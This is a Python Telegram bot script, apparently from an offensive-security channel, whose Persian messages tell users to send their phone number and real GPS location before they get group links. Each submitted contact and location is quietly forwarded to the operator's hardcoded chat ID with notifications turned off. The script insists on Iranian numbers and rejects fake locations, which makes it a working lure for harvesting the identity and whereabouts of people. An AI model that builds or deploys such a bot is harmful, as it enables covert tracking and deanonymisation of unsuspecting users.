#!/usr/bin/python
# -*- coding: UTF-8 -*-
# https://t.me/unk9vvn
# AVI
from telegram.ext import *
import telegram
import logging

updater = Updater('Your-Token')
dispatcher = updater.dispatcher
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)


def start(bot, update):
    bot.send_chat_action(chat_id=update.message.chat_id, action=telegram.ChatAction.TYPING)
    bot.send_message(chat_id=update.message.chat_id,
                     text="❗️ برای به اشتراک گذاشتن شماره اکانت خود بر روی"
                          " گزینه زیر کلیک کنید س‍پس بر روی دکمه ارسال شماره اکانت کلیک کنید."
                          "\n/contact")


def contact(bot, update):
    contact_keyboard = telegram.KeyboardButton(text="ارسال شماره اکانت", request_contact=True)
    admin_keyboard = telegram.KeyboardButton(text="ارتباط با ادمین بات")
    custom_keyboard = [[contact_keyboard],
                       [admin_keyboard]]
    reply_markup = telegram.ReplyKeyboardMarkup(custom_keyboard)
    bot.send_chat_action(chat_id=update.message.chat_id, action=telegram.ChatAction.TYPING)
    bot.send_message(chat_id=update.message.chat_id,
                     text="❕ دقت داشته باشید اگر شماره مجازی استفاده کرده باشید ربات شمار را بصورت خودکار "
                          "حذف خواهد کرد و یا اگر ساکن خارج از کشور هستید میبایست شماره اکانت ایران را تهیه نمایید.",
                     reply_markup=reply_markup)


def location(bot, update):
    location_keyboard = telegram.KeyboardButton(text="ارسال موقعیت مکانی", request_location=True)
    admin_keyboard = telegram.KeyboardButton(text="ارتباط با ادمین بات")
    custom_keyboard = [[location_keyboard],
                       [admin_keyboard]]
    reply_markup = telegram.ReplyKeyboardMarkup(custom_keyboard)
    bot.send_chat_action(chat_id=update.message.chat_id, action=telegram.ChatAction.TYPING)
    bot.send_message(chat_id=update.message.chat_id,
                     text="❕️ دقت داشته باشید اگر موقعیت مکانی شما تقلبی و غیرصحیح باشد ربات شما را بصورت خودکار"
                          " حذف خواهد کرد و یا اگر با نسخه ویندوزی و یا لینوکسی تلگرام وارد شدید حتما ارتباط خود را تعویض و"
                          " با سیستم عامل های گوشی مانند اندروید و آی او اس انجام دهید تا بتوانید موقعیت خود را ارسال نمایید.",
                     reply_markup=reply_markup)


def linker_contact(bot, update):
    bot.send_chat_action(chat_id=update.message.chat_id, action=telegram.ChatAction.TYPING)
    bot.send_message(chat_id=update.message.chat_id,
                     text="❗️ برای به اشتراک گذاشتن موقعیت مکانی"
                          " خود بر روی گزینه زیر کلیک کنید س‍پس بر روی دکمه ارسال موقعیت مکانی کلیک کنید."
                          "\n/location")
    bot.sendContact(chat_id=Your-Chat ID,
                    disable_notification=True,
                    contact=update.message.contact)


def linker_location(bot, update):
    bot.send_chat_action(chat_id=update.message.chat_id, action=telegram.ChatAction.TYPING)
    bot.send_message(chat_id=update.message.chat_id,
                     text="‼️ دقت داشته باشید که حتما قسمت Info گروه ها را مشاهده کنید تا از قوانین اطلاع پیدا کنید در صورت "
                          "تخلف از قوانین یک بار تذکر توسط ربات داده و در صورت تکرار فرد از گروه و کانال حذف خواهد شد.",)
    f = open("links.txt", "r")
    contents = f.read()
    bot.send_message(chat_id=update.message.chat_id, text=contents)
    bot.sendLocation(chat_id=Your-Chat ID,
                     disable_notification=True,
                     location=update.message.location)


linker_contact_handler = MessageHandler(Filters.contact, linker_contact)
dispatcher.add_handler(linker_contact_handler)

linker_location_handler = MessageHandler(Filters.location, linker_location)
dispatcher.add_handler(linker_location_handler)

start_contact_handler = CommandHandler('contact', contact)
dispatcher.add_handler(start_contact_handler)

start_location_handler = CommandHandler('location', location)
dispatcher.add_handler(start_location_handler)

start_handler = CommandHandler('start', start)
dispatcher.add_handler(start_handler)

updater.start_polling()
updater.idle()
